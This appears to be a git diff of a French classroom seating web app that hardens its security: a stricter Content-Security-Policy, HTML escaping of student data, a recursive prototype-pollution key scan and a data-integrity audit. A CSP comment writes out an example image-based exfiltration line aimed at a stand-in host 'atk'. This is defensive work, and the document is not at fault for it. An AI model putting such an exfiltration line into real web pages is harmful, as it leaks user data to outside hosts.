@@ -7,12 +7,20 @@
      - default-src 'self'      → ne charge ressources que depuis l'origine du fichier (= ce HTML)
      - script-src 'self' 'unsafe-inline' → JS inline (dans le fichier) + scripts liés du même dossier (sw.js)
      - style-src  'self' 'unsafe-inline' → CSS inline (dans le fichier) + feuilles liées
-     - img-src    * data: blob: → emojis SVG, icônes, captures, manifest
+     - img-src    'self' data: blob: → emojis SVG, icônes locales, captures, manifest
+                  (PAS de '*' : sinon une XSS résiduelle pourrait exfiltrer des données
+                   élèves via une balise image `new Image().src='https://atk/?'+data` ;
+                   l'app ne charge aucune image externe, donc 'self' data: blob: suffit)
+     - font-src   'self' data: → INDISPENSABLE : les 3 polices du design system (Fraunces,
+                  IBM Plex Sans, JetBrains Mono) sont embarquées en data:font/woff2;base64.
+                  Sans cette ligne, default-src 'self' les bloque et l'app retombe en
+                  silence sur les polices système (design dégradé).
      - connect-src 'self' https://api.github.com → fetch limité à GitHub API (checkForUpdate)
      - object-src 'none' / base-uri 'self' → bloque <object> et <base> (ancres XSS classiques)
-     Atténue fortement les XSS résiduels en bloquant l'exfiltration via fetch externe. -->
+     - frame-src 'none' → aucune iframe (bloque un cadre injecté)
+     Atténue fortement les XSS résiduels en bloquant l'exfiltration (fetch ET image externes). -->
 <meta http-equiv="Content-Security-Policy"
-  content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src * data: blob:; connect-src 'self' https://api.github.com; object-src 'none'; base-uri 'self'; form-action 'self'">
+  content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' https://api.github.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-src 'none'">
 <title>Plan de Classe</title>
 <link rel="manifest" href="manifest.json">
 <meta name="theme-color" content="#1a252f">
@@ -5796,11 +5804,11 @@ var _bilanHiddenCols = new Set();
 // Numéro de version affiché à l'utilisateur (semver). À incrémenter à chaque
 // release : PATCH (x.y.Z) pour un correctif, MINOR (x.Y.0) pour une fonctionnalité,
 // MAJOR (X.0.0) pour un changement de fond / rupture.
-const APP_VERSION    = '2.12.0';
+const APP_VERSION    = '2.12.1';
 // Date de build (ISO) — sert UNIQUEMENT à la détection de mise à jour (comparée à la
 // date du dernier commit GitHub). La mettre ≥ à l'instant du push pour que l'app se
 // considère « à jour » une fois en ligne. À bumper à chaque push, comme avant.
-const APP_BUILD_DATE = '2026-06-08T21:40:00Z';
+const APP_BUILD_DATE = '2026-06-09T22:11:00Z';
 // Tolérance de détection : on ne signale une MAJ que si le dernier commit GitHub
 // est plus récent que APP_BUILD_DATE de PLUS de cette marge. Absorbe le délai
 // inévitable entre « je fige APP_BUILD_DATE » et « le commit s'horodate »
@@ -5992,12 +6000,14 @@ function activeRoomData(cls) {
   if (!cls || !cls.activeRoom) return null;
   if (!cls.rooms) cls.rooms = {};
   if (!cls.rooms[cls.activeRoom]) {
-    cls.rooms[cls.activeRoom] = { seating:{}, groupes:{}, ipadsByPool:{} };
+    cls.rooms[cls.activeRoom] = _newRoomTemplate();
   }
   const r = cls.rooms[cls.activeRoom];
   if (!r.seating) r.seating = {};
   if (!r.groupes) r.groupes = {};
   if (!r.ipadsByPool) r.ipadsByPool = {};
+  if (!r.posTagId)   r.posTagId   = {};
+  if (!r.allowedFor) r.allowedFor = {};
   if (typeof r.aeshCount !== 'number') r.aeshCount = 0;
   if (!r.aeshSeating) r.aeshSeating = {};
   if (!r.aeshLinks)   r.aeshLinks   = {};
@@ -6639,6 +6649,10 @@ function postLoadHook() {
   // sur une autre machine via la sync). N'affecte PAS les élèves pas encore
   // arrivés (leur place reste réservée).
   _freeDepartedSeats();
+  // Filet de sécurité : détecte et répare les références orphelines (élèves fantômes,
+  // pointeurs de salle/pool/classe invalides) issues d'anciens bugs, d'imports partiels
+  // ou de fichiers de sync abîmés. Conservateur (ne supprime que ce qui est mort).
+  try { _auditState({ repair: true }); } catch (e) { console.warn('Audit intégrité ignoré :', e); }
 }
 
 // Migration : pour chaque room, si encore en format historique (ipads/ipads_g1/ipads_g2),
@@ -9835,7 +9849,11 @@ async function checkForUpdate() {
     const latestSha  = (data.sha || '').slice(0, 7);
     const latestDate = data.commit?.author?.date || data.commit?.committer?.date;
     const latestMsg  = (data.commit?.message || '').split('\n')[0];
-    const commitUrl  = data.html_url || `https://github.com/${APP_REPO_USER}/${APP_REPO_NAME}`;
+    const repoUrl    = `https://github.com/${APP_REPO_USER}/${APP_REPO_NAME}`;
+    // N'accepte que des URLs github.com en HTTPS (la réponse GitHub est en HTTPS, mais on
+    // se protège d'un href forgé / javascript: au cas où la réponse serait manipulée).
+    const commitUrl  = (typeof data.html_url === 'string' && /^https:\/\/github\.com\//.test(data.html_url))
+      ? data.html_url : repoUrl;
     if (!latestDate) throw new Error('Date du dernier commit introuvable');
 
     // Comparaison NUMÉRIQUE (Date.parse gère les décalages +02:00 / Z renvoyés par
@@ -9844,7 +9862,6 @@ async function checkForUpdate() {
     const isUpToDate = (Date.parse(latestDate) - Date.parse(APP_BUILD_DATE)) <= APP_UPDATE_TOLERANCE_MS;
     const isOnline   = window.location.hostname.endsWith('github.io');
 
-    const repoUrl     = `https://github.com/${APP_REPO_USER}/${APP_REPO_NAME}`;
     const downloadUrl = `${repoUrl}/archive/refs/heads/main.zip`;
     const githubPages = `https://${APP_REPO_USER.toLowerCase()}.github.io/${APP_REPO_NAME}/plan%20de%20classe.html`;
 
@@ -9853,7 +9870,7 @@ async function checkForUpdate() {
         <p style="color:#27ae60;font-size:1.15em;margin-bottom:12px"><strong>✅ Vous êtes à jour !</strong></p>
         <div style="background:#f1f8e9;border:1px solid #c5e1a5;padding:10px 14px;border-radius:4px;font-size:.9em;color:#33691e;line-height:1.7">
           Votre version : <code>v${_escAttr(APP_VERSION)}</code> <span style="font-size:.85em;color:#558b2f">(build ${_escAttr(_formatRelDate(APP_BUILD_DATE))})</span><br>
-          Dernier commit GitHub : <code>${_escAttr(_formatRelDate(latestDate))}</code> (<a href="${commitUrl}" target="_blank" rel="noopener">${latestSha}</a>)
+          Dernier commit GitHub : <code>${_escAttr(_formatRelDate(latestDate))}</code> (<a href="${_escAttr(commitUrl)}" target="_blank" rel="noopener">${_escAttr(latestSha)}</a>)
         </div>
       `;
     } else {
@@ -9861,7 +9878,7 @@ async function checkForUpdate() {
         <p style="color:#e67e22;font-size:1.15em;margin-bottom:12px"><strong>🆕 Une mise à jour est disponible !</strong></p>
         <div style="background:#fff7e6;border:1px solid #f5cba7;padding:10px 14px;border-radius:4px;font-size:.9em;line-height:1.7;margin-bottom:14px">
           Votre version : <code>v${_escAttr(APP_VERSION)}</code> <span style="font-size:.85em;color:#999">(build ${_escAttr(_formatRelDate(APP_BUILD_DATE))})</span><br>
-          Dernière sur GitHub : <code>${_escAttr(_formatRelDate(latestDate))}</code> (<a href="${commitUrl}" target="_blank" rel="noopener">${latestSha}</a>)<br>
+          Dernière sur GitHub : <code>${_escAttr(_formatRelDate(latestDate))}</code> (<a href="${_escAttr(commitUrl)}" target="_blank" rel="noopener">${_escAttr(latestSha)}</a>)<br>
           Dernier changement : <em>${_escAttr(latestMsg)}</em>
         </div>
         <div style="font-weight:600;margin-bottom:6px;font-size:.95em">Comment mettre à jour :</div>
@@ -11179,7 +11196,7 @@ function renderSeatingEntryModal() {
         cell.classList.add('oc');
         const ostu = S.eleves[occ];
         cell.innerHTML = `<span class="cpos">N°${seatLabel(r,c,cols)}</span>`
-          + (ostu ? `<div style="font-size:.68em;margin-top:2px">${ostu.prenom}<br>${ostu.nom}</div>` : '');
+          + (ostu ? `<div style="font-size:.68em;margin-top:2px">${_escName(ostu.prenom)}<br>${_escName(ostu.nom)}</div>` : '');
       } else {
         cell.classList.add('em');
         cell.innerHTML = `<span class="cpos">N°${seatLabel(r,c,cols)}</span>`;
@@ -11781,6 +11798,34 @@ function toast(msg, msOrType=2600) {
   toastTimer = setTimeout(() => el.classList.remove('on'), ms);
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// Surfaçage des erreurs : plusieurs catch{} avalent silencieusement les pannes
+// (sync, backups, IndexedDB…). Un gestionnaire global rend visible toute erreur
+// JS / promesse rejetée non gérée — l'utilisateur voit un toast discret et garde
+// un petit journal consultable en console via `window.__planClasseErrors`.
+// (N'intercepte PAS les erreurs déjà catchées localement — uniquement celles qui
+//  remonteraient autrement jusqu'à la console sans aucun retour visuel.)
+window.__planClasseErrors = [];
+function _logRuntimeError(kind, detail) {
+  try {
+    const rec = { kind, detail: String(detail || '').slice(0, 500), at: new Date().toISOString() };
+    window.__planClasseErrors.push(rec);
+    if (window.__planClasseErrors.length > 50) window.__planClasseErrors.shift();
+    console.warn('⚠️ Erreur runtime', rec);
+    if (typeof toast === 'function' && document.getElementById('toast')) {
+      toast('⚠️ Une erreur est survenue (détails en console F12). Tes données restent sauvegardées.', 'error');
+    }
+  } catch (_) { /* le gestionnaire d'erreurs ne doit jamais lever lui-même */ }
+}
+window.addEventListener('error', e => {
+  // Ignore les erreurs de chargement de ressources (img/script externes) : non pertinentes ici.
+  if (e && e.message) _logRuntimeError('error', e.message + (e.filename ? ` @${e.filename}:${e.lineno}` : ''));
+});
+window.addEventListener('unhandledrejection', e => {
+  const r = e && e.reason;
+  _logRuntimeError('promesse', (r && (r.stack || r.message)) || r);
+});
+
 function getCls() { return S.cur ? S.classes[S.cur] : null; }
 
 function showTab(name, btn) {
@@ -12117,20 +12162,35 @@ function deleteClass(id) {
       if (cls.virtual) {
         delete S.classes[id];
       } else {
-        const sidsBeingDeleted = new Set(cls.eleves);
-        cls.eleves.forEach(eid => delete S.eleves[eid]);
+        // Supprime chaque élève via le helper (nettoie seating, tablettes, évals,
+        // contraintes, paires, conseil, bulletins, et classes recomposées).
+        [...cls.eleves].forEach(eid => _deleteStudentInternal(eid));
         delete S.classes[id];
-        // Nettoyage : retire ces sids des classes recomposées qui les référencent
-        for (const c of Object.values(S.classes)) {
-          if (!c.virtual || !Array.isArray(c.eleves)) continue;
-          c.eleves = c.eleves.filter(sid => !sidsBeingDeleted.has(sid));
-          if (c.rooms) {
-            for (const room of Object.values(c.rooms)) {
-              if (!room?.seating) continue;
-              for (const k of Object.keys(room.seating)) {
-                if (sidsBeingDeleted.has(room.seating[k])) delete room.seating[k];
-              }
-            }
+        // Purge des structures indexées par classe (sinon données mortes persistées
+        // dans le JSON/sync/backups, faussant les agrégats globaux).
+        if (S.attendance)             delete S.attendance[id];
+        if (S.movedHighlights)        delete S.movedHighlights[id];
+        if (S.bulletinRemarques)      delete S.bulletinRemarques[id];
+        if (S.bulletinClassRemarques) delete S.bulletinClassRemarques[id];
+        if (S.bulletinWorkedItems)    delete S.bulletinWorkedItems[id];
+        if (S.conseilClasse)          delete S.conseilClasse[id];
+        // Snapshots rattachés à cette classe (positions + incidents)
+        if (S.snapshots) {
+          for (const sid of Object.keys(S.snapshots)) {
+            if (S.snapshots[sid]?.classId === id) delete S.snapshots[sid];
+          }
+        }
+        // Évaluations : retire la classe ; supprime l'éval si plus aucune classe vivante
+        if (S.evaluations) {
+          for (const evId of Object.keys(S.evaluations)) {
+            const ev = S.evaluations[evId];
+            if (!ev || typeof ev !== 'object') continue;
+            if (!_evalIncludesClass(ev, id)) continue;
+            if (Array.isArray(ev.classIds)) ev.classIds = ev.classIds.filter(cid => cid !== id);
+            if (ev.classId === id) ev.classId = (ev.classIds && ev.classIds[0]) || null;
+            ['dates', 'slotIds', 'datesManual'].forEach(m => { if (ev[m]) delete ev[m][id]; });
+            // Plus aucune classe encore existante référencée → éval orpheline, on la supprime
+            if (!_evalPrimaryAliveClassId(ev)) delete S.evaluations[evId];
           }
         }
       }
@@ -12735,56 +12795,147 @@ function deleteStudent(id) {
   });
 }
 
-// Supprime un élève partout (toutes salles confondues), sans confirmation ni save
-function _deleteStudentInternal(id) {
-  const s = S.eleves[id];
-  if (!s) return;
-  const cls = S.classes[s.classe_id];
-  if (cls) {
-    cls.eleves = cls.eleves.filter(eid => eid !== id);
-    if (cls.rooms) {
-      for (const room of Object.values(cls.rooms)) {
+// ─────────────────────────────────────────────────────────────────────────────
+// SOURCE UNIQUE DE VÉRITÉ pour retirer toutes les références à un élève du modèle.
+// Centralise ce qui était auparavant éparpillé (d'où les fuites de références
+// orphelines corrigées). Tout nouveau champ indexé par sid DOIT être purgé ICI.
+// NE supprime PAS S.eleves[id] lui-même → permet aussi de nettoyer un sid déjà
+// fantôme (utilisé par l'audit d'intégrité _auditState). Sans save() ni pushUndo().
+// ─────────────────────────────────────────────────────────────────────────────
+function _purgeStudentRefs(id) {
+  if (!id) return;
+  for (const c of Object.values(S.classes || {})) {
+    if (!c || typeof c !== 'object') continue;
+    // Roster (classe réelle + recomposées)
+    if (Array.isArray(c.eleves)) c.eleves = c.eleves.filter(eid => eid !== id);
+    if (c.rooms) {
+      for (const room of Object.values(c.rooms)) {
+        if (!room) continue;
+        // Siège + tablettes (formats legacy ipads* ET courant ipadsByPool)
         for (const k of Object.keys(room.seating || {})) {
-          if (room.seating[k] === id) {
-            delete room.seating[k];
-            if (room.ipads)    delete room.ipads[k];
-            if (room.ipads_g1) delete room.ipads_g1[k];
-            if (room.ipads_g2) delete room.ipads_g2[k];
-            if (room.ipads_g3) delete room.ipads_g3[k];
+          if (room.seating[k] !== id) continue;
+          delete room.seating[k];
+          if (room.ipads)    delete room.ipads[k];
+          if (room.ipads_g1) delete room.ipads_g1[k];
+          if (room.ipads_g2) delete room.ipads_g2[k];
+          if (room.ipads_g3) delete room.ipads_g3[k];
+          if (room.ipadsByPool) {
+            for (const pool of Object.values(room.ipadsByPool)) {
+              if (!pool) continue;
+              ['ce','g1','g2','g3'].forEach(m => { if (pool[m]) delete pool[m][k]; });
+            }
+          }
+        }
+        // Contraintes de place + liens AESH
+        if (room.allowedFor) delete room.allowedFor[id];
+        if (room.aeshLinks) {
+          for (const idx of Object.keys(room.aeshLinks)) {
+            if (Array.isArray(room.aeshLinks[idx]))
+              room.aeshLinks[idx] = room.aeshLinks[idx].filter(sid => sid !== id);
           }
         }
       }
     }
-  }
-  // Nettoie aussi les classes recomposées qui contiennent cet élève
-  for (const c of Object.values(S.classes)) {
-    if (c.virtual && Array.isArray(c.eleves) && c.eleves.includes(id)) {
-      c.eleves = c.eleves.filter(eid => eid !== id);
-      // Retire l'élève des seatings de toutes les salles de la classe recomposée
-      if (c.rooms) {
-        for (const room of Object.values(c.rooms)) {
-          if (!room?.seating) continue;
-          for (const k of Object.keys(room.seating)) {
-            if (room.seating[k] === id) delete room.seating[k];
-          }
-        }
-      }
+    // Paires à séparer + appartenance par période
+    if (Array.isArray(c.noNeighbors)) {
+      c.noNeighbors = c.noNeighbors.filter(pair => {
+        const p = String(pair).split('|');
+        return p[0] !== id && p[1] !== id;
+      });
     }
+    if (c.membership) delete c.membership[id];
   }
-  // F2 — Nettoyage des références à cet élève dans les évaluations (notes, niveaux
-  // de passation, remarques). Sans ça, les saisies restent orphelines dans le JSON
-  // et faussent les agrégats / exports.
+  // Évaluations : notes, remarques élève, niveaux de passation
   for (const ev of Object.values(S.evaluations || {})) {
     if (!ev || typeof ev !== 'object') continue;
     if (ev.notes) delete ev.notes[id];
     if (ev.studentRemarks) delete ev.studentRemarks[id];
-    if (Array.isArray(ev.passations)) {
-      for (const p of ev.passations) {
-        if (p && p.niveaux) delete p.niveaux[id];
+    if (Array.isArray(ev.passations))
+      for (const p of ev.passations) if (p && p.niveaux) delete p.niveaux[id];
+  }
+  // conseilClasse[classId][disciplineId][sid] + bulletinRemarques[classId][disciplineId][sid]
+  for (const store of [S.conseilClasse, S.bulletinRemarques]) {
+    if (!store || typeof store !== 'object') continue;
+    for (const byDisc of Object.values(store)) {
+      if (!byDisc || typeof byDisc !== 'object') continue;
+      for (const bySid of Object.values(byDisc)) {
+        if (bySid && typeof bySid === 'object') delete bySid[id];
       }
     }
   }
+}
+
+// Supprime un élève partout (toutes salles confondues), sans confirmation ni save
+function _deleteStudentInternal(id) {
+  if (!S.eleves[id]) return;
+  _purgeStudentRefs(id);
   delete S.eleves[id];
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Audit d'intégrité de l'état. Détecte (et répare en option) les références
+// orphelines — la classe de bugs que l'app a connue (suppression incomplète,
+// import partiel, fichier de sync abîmé). Conservateur : ne touche QUE ce qui
+// est sans ambiguïté mort (sid absent de S.eleves, pointeurs salle/pool/classe
+// invalides). Retourne { issues:[...], repaired:n }. Lancé en fin de postLoadHook.
+// ─────────────────────────────────────────────────────────────────────────────
+function _auditState(opts = {}) {
+  const repair = opts.repair !== false;
+  const issues = [];
+  let repaired = 0;
+  const alive = sid => !!(S.eleves && S.eleves[sid]);
+
+  // 1) Élèves fantômes : référencés quelque part mais absents de S.eleves.
+  const ghost = new Set();
+  for (const c of Object.values(S.classes || {})) {
+    if (!c) continue;
+    if (Array.isArray(c.eleves)) c.eleves.forEach(sid => { if (!alive(sid)) ghost.add(sid); });
+    if (c.rooms) for (const room of Object.values(c.rooms)) {
+      if (room?.seating) for (const sid of Object.values(room.seating)) if (!alive(sid)) ghost.add(sid);
+      if (room?.allowedFor) for (const sid of Object.keys(room.allowedFor)) if (!alive(sid)) ghost.add(sid);
+      if (room?.aeshLinks) for (const arr of Object.values(room.aeshLinks))
+        if (Array.isArray(arr)) arr.forEach(sid => { if (!alive(sid)) ghost.add(sid); });
+    }
+    if (Array.isArray(c.noNeighbors)) for (const pair of c.noNeighbors)
+      String(pair).split('|').forEach(sid => { if (sid && !alive(sid)) ghost.add(sid); });
+    if (c.membership) for (const sid of Object.keys(c.membership)) if (!alive(sid)) ghost.add(sid);
+  }
+  for (const ev of Object.values(S.evaluations || {})) {
+    if (ev?.notes) for (const sid of Object.keys(ev.notes)) if (!alive(sid)) ghost.add(sid);
+  }
+  if (ghost.size) {
+    issues.push(`${ghost.size} élève(s) fantôme(s) référencé(s) hors liste`);
+    if (repair) { ghost.forEach(sid => _purgeStudentRefs(sid)); repaired += ghost.size; }
+  }
+
+  // 2/3) Pointeurs de salle / classe mobile invalides par classe.
+  for (const c of Object.values(S.classes || {})) {
+    if (!c) continue;
+    if (c.activeRoom && !S.salles?.[c.activeRoom]) {
+      issues.push(`Classe "${c.nom || c.id}" : salle active introuvable (${c.activeRoom})`);
+      if (repair) {
+        const firstRoom = c.rooms ? Object.keys(c.rooms).find(rid => S.salles?.[rid]) : null;
+        c.activeRoom = firstRoom || Object.keys(S.salles || {})[0] || null;
+        repaired++;
+      }
+    }
+    if (c.activePool && !S.tabletPools?.[c.activePool]) {
+      issues.push(`Classe "${c.nom || c.id}" : classe mobile active introuvable (${c.activePool})`);
+      if (repair && typeof _ensureActivePool === 'function') { _ensureActivePool(c); repaired++; }
+    }
+  }
+
+  // 4) Classe courante invalide.
+  if (S.cur && !S.classes?.[S.cur]) {
+    issues.push(`Classe courante introuvable (${S.cur})`);
+    if (repair) { S.cur = Object.keys(S.classes || {})[0] || null; repaired++; }
+  }
+
+  if (issues.length) {
+    console.warn('🔍 Audit intégrité :', issues,
+      repair ? `→ ${repaired} réparation(s) appliquée(s)` : '(lecture seule)');
+  }
+  return { issues, repaired };
 }
 
 // Déplace un élève d'une classe réelle vers une autre classe réelle.
@@ -16463,7 +16614,7 @@ function renderUnplaced() {
     : allUnplaced;
 
   if (!list.length) {
-    el.innerHTML = `<p style="color:#888;font-size:.85em">Aucun résultat pour « ${filter} »</p>`;
+    el.innerHTML = `<p style="color:#888;font-size:.85em">Aucun résultat pour « ${_escAttr(filter)} »</p>`;
     return;
   }
 
@@ -18600,7 +18751,7 @@ function renderSalleSchedule() {
   }
   const rows = slots.map((sl, i) => `
     <tr>
-      <td style="padding:3px 6px"><input type="text" value="${sl.label || sl.id || ''}" onchange="updateSalleSlot(${i},'label',this.value)" style="width:90px;padding:3px 6px;border:1px solid #ccc;border-radius:3px;font-size:.9em"></td>
+      <td style="padding:3px 6px"><input type="text" value="${_escAttr(sl.label || sl.id || '')}" onchange="updateSalleSlot(${i},'label',this.value)" style="width:90px;padding:3px 6px;border:1px solid #ccc;border-radius:3px;font-size:.9em"></td>
       <td style="padding:3px 6px"><input type="time" value="${sl.start || ''}" onchange="updateSalleSlot(${i},'start',this.value)" style="padding:3px 6px;border:1px solid #ccc;border-radius:3px;font-size:.9em"></td>
       <td style="padding:3px 6px"><input type="time" value="${sl.end || ''}" onchange="updateSalleSlot(${i},'end',this.value)" style="padding:3px 6px;border:1px solid #ccc;border-radius:3px;font-size:.9em"></td>
       <td style="padding:3px 6px"><button class="btn btn-d btn-sm" onclick="deleteSalleSlot(${i})" title="Supprimer ce créneau">✕</button></td>
@@ -22171,7 +22322,7 @@ function saveAttRefreshSlots() {
 
   let html = '<option value="">— Aucun créneau (libre) —</option>';
   for (const sl of slots) {
-    html += `<option value="${sl.id}"${sl.id===preSlotId?' selected':''}>${sl.label} (${sl.start} – ${sl.end})</option>`;
+    html += `<option value="${_escAttr(sl.id)}"${sl.id===preSlotId?' selected':''}>${_escAttr(sl.label)} (${_escAttr(sl.start)} – ${_escAttr(sl.end)})</option>`;
   }
   sel.innerHTML = html;
   saveAttUpdateLabel();
@@ -24211,7 +24362,7 @@ function buildTeacherPageHTML(cls) {
           : '';
         inner = `${stuG ? `<span class="pgb g${stuG}">G${stuG}</span>` : ''}
                  ${aeshBadge}
-                 <div class="pn">${stu.prenom}<br>${stu.nom}</div>
+                 <div class="pn">${_escName(stu.prenom)}<br>${_escName(stu.nom)}</div>
                  ${ipad && _featureEnabled('tablettes') ? `<div class="pi">Tab. ${ipad}</div>` : ''}
                  <div style="display:flex;gap:2px;justify-content:center;margin-top:2px">
                    <span class="pinc" style="background:${oubliColor(stu.oublis)};border-radius:3px;padding:0 3px;font-size:.75em">📦 ${stu.oublis}</span>
@@ -24591,7 +24742,27 @@ async function autoSaveDoIt(isRetry) {
     if (perm !== 'granted') return;
     const json = JSON.stringify(S, null, 2);
 
-    // Fichier principal (toujours écrasé)
+    // Garde anti-écrasement (workflow multi-appareils via Nextcloud) : si le fichier
+    // sur disque est devenu PLUS RÉCENT que notre dernière écriture, c'est qu'un autre
+    // appareil l'a synchronisé entre-temps. On NE l'écrase PAS en aveugle : on suspend
+    // l'écriture et on déclenche la procédure de rechargement (qui demande à
+    // l'utilisateur). Sans ça, l'auto-save écrasait silencieusement les modifs distantes.
+    // (Même seuil de 1500 ms que autoReloadCheck. _lastDiskWriteTs === 0 = pas encore
+    // de référence fiable → on laisse autoReloadCheck/_maybeProposeInitialReload gérer.)
+    if (_lastDiskWriteTs > 0) {
+      try {
+        const existingFh = await dirHandle.getFileHandle(AUTO_SAVE_FILENAME); // sans create
+        const existing   = await existingFh.getFile();
+        if (existing.lastModified > _lastDiskWriteTs + 1500) {
+          _showAutoSyncStatus('⏸ sync suspendue',
+            'Le fichier de sync a été modifié par un autre appareil. Écriture suspendue pour ne pas écraser ces changements — choisis de recharger (ou non) via la fenêtre proposée.');
+          autoReloadCheck();
+          return;
+        }
+      } catch (_) { /* fichier introuvable → première écriture, on continue normalement */ }
+    }
+
+    // Fichier principal (écrasé après la vérification anti-conflit ci-dessus)
     const fh = await dirHandle.getFileHandle(AUTO_SAVE_FILENAME, { create: true });
     const w  = await fh.createWritable();
     await w.write(json);
@@ -25275,6 +25446,29 @@ function _validateImport(d) {
   const ID_RE = /^[A-Za-z0-9_\-:.]{1,128}$/;
   // Rejet explicite des clés "magiques" qui polluent Object.prototype (S1).
   const POISON_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+  // Scan RÉCURSIF, ciblé uniquement sur les clés empoisonnées, sur tout l'arbre
+  // importé (les contrôles ID_RE ci-dessous restent volontairement en surface :
+  // en profondeur, des clés légitimes comme 'r,c' ou '2026-05-30' échoueraient).
+  // JSON.parse matérialise '__proto__' comme propriété PROPRE → Object.keys la voit.
+  const deepPoisonScan = (obj, path, depth) => {
+    if (!obj || typeof obj !== 'object' || depth > 60) return null;
+    if (Array.isArray(obj)) {
+      for (let i = 0; i < obj.length; i++) {
+        const err = deepPoisonScan(obj[i], `${path}[${i}]`, depth + 1);
+        if (err) return err;
+      }
+      return null;
+    }
+    for (const k of Object.keys(obj)) {
+      if (POISON_KEYS.has(k)) {
+        return `Clé interdite dans ${path}.${k} (réservée — risque de prototype pollution).`;
+      }
+      const err = deepPoisonScan(obj[k], `${path}.${k}`, depth + 1);
+      if (err) return err;
+    }
+    return null;
+  };
+  { const err = deepPoisonScan(d, 'racine', 0); if (err) return err; }
   const checkKeys = (obj, where) => {
     if (!obj || typeof obj !== 'object') return null;
     for (const k of Object.keys(obj)) {
